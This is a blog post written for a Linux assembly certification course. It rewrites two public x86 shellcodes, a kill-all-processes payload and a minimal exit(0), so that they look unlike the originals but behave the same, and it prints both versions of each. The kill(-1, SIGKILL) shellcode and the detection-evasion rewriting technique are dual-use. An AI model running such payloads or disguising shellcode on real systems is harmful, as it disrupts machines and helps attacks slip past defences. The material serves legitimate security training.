<i>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</i><br /><i> </i><i><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></i><br /><i> </i><i><b>Student ID:</b>&nbsp;SLAE-885</i><br /><i><b>Assignment number: </b>6.2 and 6.3</i><br /><i><b>Github repo:</b> <a href="https://github.com/abatchy17/SLAE">https://github.com/abatchy17/SLAE</a>&nbsp;&nbsp;</i><br /><i><br /></i> In assignment 6, the requirement is polymorphing 3+ shellcodes off shellstorm.org or exploit-db.com<i>, </i>which  basically means modifying the code so it doesn't look like the original  yet has the same functionality. This post contains the remaining 2 parts for assignment 3.<br /><br /><h2>Linux/x86 - kill all processes&nbsp;</h2>The following shellcode is written by Kris Katterjohn and can be found <a href="http://shell-storm.org/shellcode/files/shellcode-212.php">here</a>.<br /><pre style="background: #000000; color: #d1d1d1;"><span style="color: #008073;">section</span> .text<br /><br /><span style="color: #008073;">global</span> _start<br /><br /><span style="color: #e34adc;">_start:</span><br /><br />    <span style="color: #9999a9;">; kill(-1, SIGKILL)</span><br /><br />    <span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #008c00;">37</span><br />    <span style="color: #e66170; font-weight: bold;">pop</span> <span style="color: #d0d09f;">eax</span><br />    <span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #008c00;">-1</span><br />    <span style="color: #e66170; font-weight: bold;">pop</span> <span style="color: #d0d09f;">ebx</span><br />    <span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #008c00;">9</span><br />    <span style="color: #e66170; font-weight: bold;">pop</span> <span style="color: #d0d09f;">ecx</span><br />    <span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #00a800;">0x80</span><br /></pre><br />Very simple code, it sets EAX to 37 (syscall for <b>kill()</b>), sets EBX to -1 (to target all processes) and ECX to 9 (SIGKILL).<br /><br />Let's modify this code slightly:<br /><br /><pre style="background: #000000; color: #d1d1d1;"><span style="color: #008073;">section</span> .text<br /><br /><span style="color: #008073;">global</span> _start<br /><br /><span style="color: #e34adc;">_start:</span><br /><br />    <span style="color: #9999a9;">; kill(-1, SIGKILL)</span><br /><br />    <span style="color: #e66170; font-weight: bold;">xor</span> <span style="color: #d0d09f;">ebx</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">ebx</span><br />    <span style="color: #e66170; font-weight: bold;">dec</span> <span style="color: #d0d09f;">ebx</span><br />    <span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #008c00;">37</span><br />    <span style="color: #e66170; font-weight: bold;">pop</span> <span style="color: #d0d09f;">eax</span><br />    <span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #008c00;">9</span><br />    <span style="color: #e66170; font-weight: bold;">pop</span> <span style="color: #d0d09f;">ecx</span><br />    <span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #00a800;">0x80</span><br /></pre><br />See what I did there? Shellcode is of same size so we're good.<br /><br /><h2>Linux/x86 - exit(0)</h2>The following shellcode is written by gunslinger_ and can be found <a href="http://shell-storm.org/shellcode/files/shellcode-623.php">here</a>.<br /><br /><pre style="background: #000000; color: #d1d1d1;"><span style="color: #9999a9;">/*</span><br /><span style="color: #9999a9;">Name   : 8 bytes sys_exit(0) x86 linux shellcode</span><br /><span style="color: #9999a9;">Date   : may, 31 2010</span><br /><span style="color: #9999a9;">Author : gunslinger_</span><br /><span style="color: #9999a9;">Web    : devilzc0de.com</span><br /><span style="color: #9999a9;">blog   : gunslinger.devilzc0de.com</span><br /><span style="color: #9999a9;">tested on : linux debian</span><br /><span style="color: #9999a9;">*/</span><br /><br /><span style="color: #e66170; font-weight: bold;">char</span> <span style="color: #d2cd86;">*</span>bye<span style="color: #d2cd86;">=</span><br /> <span style="color: #02d045;">"</span><span style="color: teal;">\x31</span><span style="color: teal;">\xc0</span><span style="color: #02d045;">"</span>                    <span style="color: #9999a9;">/* xor    %eax,%eax */</span><br /> <span style="color: #02d045;">"</span><span style="color: teal;">\xb0</span><span style="color: teal;">\x01</span><span style="color: #02d045;">"</span>                    <span style="color: #9999a9;">/* mov    $0x1,%al */</span><br /> <span style="color: #02d045;">"</span><span style="color: teal;">\x31</span><span style="color: teal;">\xdb</span><span style="color: #02d045;">"</span>                    <span style="color: #9999a9;">/* xor    %ebx,%ebx */</span><br /> <span style="color: #02d045;">"</span><span style="color: teal;">\xcd</span><span style="color: teal;">\x80</span><span style="color: #02d045;">"</span><span style="color: #b060b0;">;</span>                   <span style="color: #9999a9;">/* int    $0x80 */</span><br /><br /><span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #e66170; font-weight: bold;">main</span><span style="color: #d2cd86;">(</span><span style="color: #e66170; font-weight: bold;">void</span><span style="color: #d2cd86;">)</span><br /><span style="color: #b060b0;">{</span><br />  <span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">(</span><span style="color: #e66170; font-weight: bold;">void</span> <span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">*</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">(</span><span style="color: #e66170; font-weight: bold;">void</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span> bye<span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">;</span><br />  <span style="color: #e66170; font-weight: bold;">return</span> <span style="color: #008c00;">0</span><span style="color: #b060b0;">;</span><br /><span style="color: #b060b0;">}</span><br /></pre><br />What can we do about this code? Well, <b>mov al, 0x1</b> can be replaced with <b>inc eax.</b><br /><br /><pre style="background: #000000; color: #d1d1d1;">global _start<br /><span style="color: #e34adc;">_start:</span><br /><br />xor eax<span style="color: #d2cd86;">,</span> eax<br />inc eax<br />xor ebx<span style="color: #d2cd86;">,</span> ebx<br /><span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #00a800;">0x80</span><br /></pre><br />Shellcode is now one byte smaller, sweet.<br /><br />- Abatchy